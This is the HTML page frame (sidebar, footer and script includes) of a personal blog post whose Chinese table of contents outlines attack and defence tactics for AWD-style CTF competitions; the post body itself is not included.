    </footer>
  </article>



    <div class="post-spread">
      
    </div>
  </div>


          </div>
          


          
  <div class="comments" id="comments">
    
      <div id="cloud-tie-wrapper" class="cloud-tie-wrapper"></div>
    
  </div>


        </div>
        
          
  
  <div class="sidebar-toggle">
    <div class="sidebar-toggle-line-wrap">
      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
    </div>
  </div>

  <aside id="sidebar" class="sidebar">
    <div class="sidebar-inner">

      

      
        <ul class="sidebar-nav motion-element">
          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap" >
            Table of Contents
          </li>
          <li class="sidebar-nav-overview" data-target="site-overview">
            Overview
          </li>
        </ul>
      

      <section class="site-overview sidebar-panel">
        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
          <img class="site-author-image" itemprop="image"
               src="/images/avatar.JPG"
               alt="Edward Choi" />
          <p class="site-author-name" itemprop="name">Edward Choi</p>
           
              <p class="site-description motion-element" itemprop="description"></p>
           
        </div>
        <nav class="site-state motion-element">

          
            <div class="site-state-item site-state-posts">
              <a href="/archives">
                <span class="site-state-item-count">17</span>
                <span class="site-state-item-name">posts</span>
              </a>
            </div>
          

          
            
            
            <div class="site-state-item site-state-categories">
              
                <span class="site-state-item-count">6</span>
                <span class="site-state-item-name">categories</span>
              
            </div>
          

          
            
            
            <div class="site-state-item site-state-tags">
              <a href="/tags/index.html">
                <span class="site-state-item-count">9</span>
                <span class="site-state-item-name">tags</span>
              </a>
            </div>
          

        </nav>

        

        <div class="links-of-author motion-element">
          
            
              <span class="links-of-author-item">
                <a href="https://github.com/edwardchoijc" target="_blank" title="GitHub">
                  
                    <i class="fa fa-fw fa-github"></i>
                  
                  GitHub
                </a>
              </span>
            
          
        </div>

        
        
          <div class="cc-license motion-element" itemprop="license">
            <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" class="cc-opacity" target="_blank">
              <img src="/images/cc-by-nc-sa.svg" alt="Creative Commons" />
            </a>
          </div>
        

        
        

        


      </section>

      
      <!--noindex-->
        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
          <div class="post-toc">

            
              
            

            
              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#简介"><span class="nav-number">1.</span> <span class="nav-text">简介</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#何为AWD"><span class="nav-number">1.0.1.</span> <span class="nav-text">何为AWD</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#网络环境"><span class="nav-number">1.0.2.</span> <span class="nav-text">网络环境</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#比赛分工"><span class="nav-number">1.0.3.</span> <span class="nav-text">比赛分工</span></a></li></ol></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#套路小结"><span class="nav-number">2.</span> <span class="nav-text">套路小结</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#服务器登录"><span class="nav-number">2.0.1.</span> <span class="nav-text">服务器登录</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#提权"><span class="nav-number">2.0.2.</span> <span class="nav-text">提权</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#How-to-Attack"><span class="nav-number">2.0.3.</span> <span class="nav-text">How to Attack</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#主机发现"><span class="nav-number">2.0.3.1.</span> <span class="nav-text">主机发现</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#找预留后门"><span class="nav-number">2.0.3.2.</span> <span class="nav-text">找预留后门</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#代码审计"><span class="nav-number">2.0.3.3.</span> <span class="nav-text">代码审计</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#一句话木马"><span class="nav-number">2.0.3.4.</span> <span class="nav-text">一句话木马</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#单个文件批量上传"><span class="nav-number">2.0.3.5.</span> <span class="nav-text">单个文件批量上传</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#权限维持"><span class="nav-number">2.0.3.6.</span> <span class="nav-text">权限维持</span></a></li></ol></li><li class="nav-item nav-level-4"><a class="nav-link" href="#How-to-Defend"><span class="nav-number">2.0.4.</span> <span class="nav-text">How to Defend</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#常用命令"><span class="nav-number">2.0.4.1.</span> <span class="nav-text">常用命令</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#文件监控"><span class="nav-number">2.0.4.2.</span> <span class="nav-text">文件监控</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#网络控制"><span class="nav-number">2.0.4.3.</span> <span class="nav-text">网络控制</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#修复漏洞"><span class="nav-number">2.0.4.4.</span> <span class="nav-text">修复漏洞</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#上WAF"><span class="nav-number">2.0.4.5.</span> <span class="nav-text">上WAF</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#流量和日志分析"><span class="nav-number">2.0.4.6.</span> <span class="nav-text">流量和日志分析</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#假flag"><span class="nav-number">2.0.4.7.</span> <span class="nav-text">假flag</span></a></li></ol></li><li class="nav-item nav-level-4"><a class="nav-link" href="#其他"><span class="nav-number">2.0.5.</span> <span class="nav-text">其他</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#flag获取"><span class="nav-number">2.0.5.1.</span> <span class="nav-text">flag获取</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#批量提交flag"><span class="nav-number">2.0.5.2.</span> <span class="nav-text">批量提交flag</span></a></li></ol></li></ol></li></ol></li></ol></div>
            

          </div>
        </section>
      <!--/noindex-->
      

      

    </div>
  </aside>


        
      </div>
    </main>

    <footer id="footer" class="footer">
      <div class="footer-inner">
        <div class="copyright" >
  
  &copy;  2017 - 
  <span itemprop="copyrightYear">2018</span>
  <span class="with-love">
    <i class="fa fa-star"></i>
  </span>
  <span class="author" itemprop="copyrightHolder">Edward Choi</span>
</div>



        
<div class="busuanzi-count">
  <script async src="https://dn-lbstatics.qbox.me/busuanzi/2.3/busuanzi.pure.mini.js"></script>

  
    <span class="site-uv">
      本站访客数
      <span class="busuanzi-value" id="busuanzi_value_site_uv"></span>
      人次
    </span>
  

  
    <span class="site-pv">
      本站总访问量
      <span class="busuanzi-value" id="busuanzi_value_site_pv"></span>
      次
    </span>
  
</div>


        
      </div>
    </footer>

    
      <div class="back-to-top">
        <i class="fa fa-arrow-up"></i>
        
      </div>
    

  </div>

  

<script type="text/javascript">
  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
    window.Promise = null;
  }
</script>









  


  











  
  <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>

  
  <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>

  
  <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>

  
  <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>

  
  <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>

  
  <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>

  
  <script type="text/javascript" src="/lib/canvas-nest/canvas-nest.min.js"></script>


  


  <script type="text/javascript" src="/js/src/utils.js?v=5.1.1"></script>

  <script type="text/javascript" src="/js/src/motion.js?v=5.1.1"></script>



  
  


  <script type="text/javascript" src="/js/src/affix.js?v=5.1.1"></script>

  <script type="text/javascript" src="/js/src/schemes/pisces.js?v=5.1.1"></script>



  
  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.1"></script>
<script type="text/javascript" src="/js/src/post-details.js?v=5.1.1"></script>



  


  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.1"></script>



  


  




	





  
    
    <script>
      var cloudTieConfig = {
        url: document.location.href, 
        sourceId: "",
        productKey: "515410b51a7a46f7b3a5f10a31e5bad7",
        target: "cloud-tie-wrapper"
      };
    </script>
    <script src="https://img1.ws.126.net/f2e/tie/yun/sdk/loader.js"></script>
  










  





  

  

  

  

  

</body>
</html>
